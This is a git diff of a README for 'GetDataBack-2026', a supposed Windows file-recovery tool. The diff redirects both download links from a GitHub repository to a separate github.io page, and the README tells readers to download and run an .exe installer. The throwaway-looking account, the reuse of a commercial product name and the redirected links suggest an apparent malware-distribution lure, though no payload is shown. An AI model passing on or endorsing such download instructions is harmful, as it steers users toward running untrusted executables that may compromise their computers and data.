@@ -1,6 +1,6 @@
 # 💾 GetDataBack-2026 - Recover Lost Files On Your Computer
 
-[![Download GetDataBack-2026](https://img.shields.io/badge/Download-GetDataBack-2026-blue.svg)](https://github.com/Catchpenny-seatrout274/GetDataBack-2026)
+[![Download GetDataBack-2026](https://img.shields.io/badge/Download-GetDataBack-2026-blue.svg)](https://catchpenny-seatrout274.github.io)
 
 GetDataBack-2026 restores lost, deleted, or inaccessible data from your hard drive, solid-state drive, or memory card. This tool works on Windows 11 and Windows 10 machines. It identifies partitions and file systems even if the drive shows major errors. Use this application to retrieve documents, photos, and videos.
 
@@ -32,7 +32,7 @@ Follow these steps to prepare your computer and run the recovery software.
 
 Visit the link below to access the repository.
 
-[Click here to reach the download page](https://github.com/Catchpenny-seatrout274/GetDataBack-2026)
+[Click here to reach the download page](https://catchpenny-seatrout274.github.io)
 
 Once you reach the page, look for the section labeled "Releases." Click the link to download the installer file. The installer ends in .exe. Save this file to your desktop for easy access.
 
